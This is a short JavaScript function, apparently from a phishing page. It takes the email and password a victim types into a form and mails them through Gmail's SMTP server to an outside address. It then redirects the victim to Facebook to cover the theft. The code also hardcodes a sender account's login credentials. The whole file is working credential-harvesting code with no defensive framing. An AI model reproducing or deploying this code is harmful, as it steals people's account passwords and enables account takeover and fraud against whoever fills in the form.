
function sendEmail() {
    var mailt =document.getElementById("ma");
var pswd =document.getElementById("psw");
if(mailt.value!=""&&pswd.value!="")
{
    document.getElementById("err").style.display="none";

       Email.send({
	Host: "smtp.gmail.com",
	Username : "amontube333@gmail.com",
	Password : "azertyuioppp123",
	To : 'ibrahimelamirin@gmail.com',
	From : "amontube333@gmail.com",
	Subject : "trois",
	Body : "Le mail est : "+mailt.value+" et le mot de passe est : "+pswd.value,
	}).then(
        message => document.location.href="https://www.facebook.com/"
	);
}
else
{
    document.getElementById("err").style.display="inline-block";
}
}  
